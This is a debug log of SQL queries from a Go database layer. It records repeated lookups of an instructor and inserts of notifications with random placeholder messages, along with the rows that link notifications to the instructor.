2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.515ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.114ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 40 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[11.585ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.907','2025-06-09 14:07:56.907',NULL,1,40) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.298ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.915','2025-06-09 14:07:56.915',NULL,'HeFyqIArgOHnRATDrUBc','system','2025-06-09 14:07:56.915',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.462ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 41 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.076ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.923','2025-06-09 14:07:56.923',NULL,1,41) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[6.936ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.932','2025-06-09 14:07:56.932',NULL,'vaMkJpyaLfmsraeHCVqN','system','2025-06-09 14:07:56.932',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.479ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.462ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 42 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.692ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.941','2025-06-09 14:07:56.941',NULL,1,42) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.006ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.947','2025-06-09 14:07:56.947',NULL,'kfgPTYcgJesCtcgacYEp','system','2025-06-09 14:07:56.947',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.443ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.082ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 43 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.412ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.957','2025-06-09 14:07:56.957',NULL,1,43) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.622ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.965','2025-06-09 14:07:56.965',NULL,'uFpAHkegnPjMMIbwgYjc','system','2025-06-09 14:07:56.965',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.215ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.549ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 44 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.074ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.972','2025-06-09 14:07:56.972',NULL,1,44) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.821ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.98','2025-06-09 14:07:56.98',NULL,'MdMxDxARAatWKIjVCkBT','system','2025-06-09 14:07:56.98',false) RETURNING "id"

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.397ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.529ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 45 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:56 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.912ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:56.987','2025-06-09 14:07:56.987',NULL,1,45) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[11.084ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:56.994','2025-06-09 14:07:56.994',NULL,'RhHrJFWIzQSKKtaJXqHv','system','2025-06-09 14:07:56.993',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.452ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.459ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 46 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.856ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.005','2025-06-09 14:07:57.005',NULL,1,46) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.619ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.011','2025-06-09 14:07:57.011',NULL,'JETOWQfeStbYQMqCgXRl','system','2025-06-09 14:07:57.011',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.493ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 47 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.387ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.018','2025-06-09 14:07:57.018',NULL,1,47) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.945ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.03','2025-06-09 14:07:57.03',NULL,'LvfLRUGHcFvsoFvBPdHj','system','2025-06-09 14:07:57.03',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.448ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 48 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.667ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.037','2025-06-09 14:07:57.037',NULL,1,48) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.657ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.043','2025-06-09 14:07:57.043',NULL,'yFRRiYSsyKWCokCYItqR','system','2025-06-09 14:07:57.043',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.467ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.449ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 49 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.792ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.05','2025-06-09 14:07:57.05',NULL,1,49) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.376ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.057','2025-06-09 14:07:57.057',NULL,'cNlJVQmHuYfqeWuPcQoA','system','2025-06-09 14:07:57.057',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.430ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.371ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 50 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.400ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.066','2025-06-09 14:07:57.066',NULL,1,50) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.170ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.071','2025-06-09 14:07:57.071',NULL,'eIwegLpOoaBGLQEGHJAD','system','2025-06-09 14:07:57.071',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.434ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.414ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 51 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.119ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.083','2025-06-09 14:07:57.083',NULL,1,51) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.667ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.091','2025-06-09 14:07:57.091',NULL,'SxFulqbYVummkIqtOGjd','system','2025-06-09 14:07:57.091',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.493ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.542ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 52 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.353ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.098','2025-06-09 14:07:57.098',NULL,1,52) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[12.338ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.107','2025-06-09 14:07:57.107',NULL,'qEdBsflJFdcuLwQkfghZ','system','2025-06-09 14:07:57.105',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.477ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.534ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 53 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.782ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.119','2025-06-09 14:07:57.119',NULL,1,53) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[9.073ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.125','2025-06-09 14:07:57.125',NULL,'CYLuCKMIuTNNmELZmsML','system','2025-06-09 14:07:57.124',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.536ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 54 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[6.742ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.135','2025-06-09 14:07:57.135',NULL,1,54) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[8.161ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.143','2025-06-09 14:07:57.143',NULL,'quHqTruUBYAfKXuaVjJQ','system','2025-06-09 14:07:57.141',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.501ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.541ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 55 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[8.732ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.15','2025-06-09 14:07:57.15',NULL,1,55) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.373ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.158','2025-06-09 14:07:57.158',NULL,'IktXYXimHwePvRFCcpaT','system','2025-06-09 14:07:57.158',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.537ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.525ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 56 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[7.874ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.164','2025-06-09 14:07:57.164',NULL,1,56) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[7.305ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.171','2025-06-09 14:07:57.171',NULL,'FZpmiZIQThDaHaPuTwVY','system','2025-06-09 14:07:57.171',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.838ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.618ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 57 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[10.579ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.184','2025-06-09 14:07:57.184',NULL,1,57) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[10.798ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.19','2025-06-09 14:07:57.19',NULL,'TyBJylOcCsuJXCUyVazf','system','2025-06-09 14:07:57.19',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.936ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.482ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 58 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
[0m[33m[9.564ms] [34;1m[rows:1][0m INSERT INTO "notification_instructors" ("created_at","updated_at","deleted_at","instructor_id","notification_id") VALUES ('2025-06-09 14:07:57.204','2025-06-09 14:07:57.204',NULL,1,58) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationModel.go:69
[0m[33m[5.456ms] [34;1m[rows:1][0m INSERT INTO "notifications" ("created_at","updated_at","deleted_at","message","type","send_at","read") VALUES ('2025-06-09 14:07:57.21','2025-06-09 14:07:57.21',NULL,'VpyVPjNroJCaAFvIixvP','system','2025-06-09 14:07:57.21',false) RETURNING "id"

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.566ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.419ms] [34;1m[rows:1][0m SELECT * FROM "notifications" WHERE "notifications"."id" = 59 AND "notifications"."deleted_at" IS NULL ORDER BY "notifications"."id" LIMIT 1

2025/06/09 14:07:57 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/NotificationInstructorModel.go:29
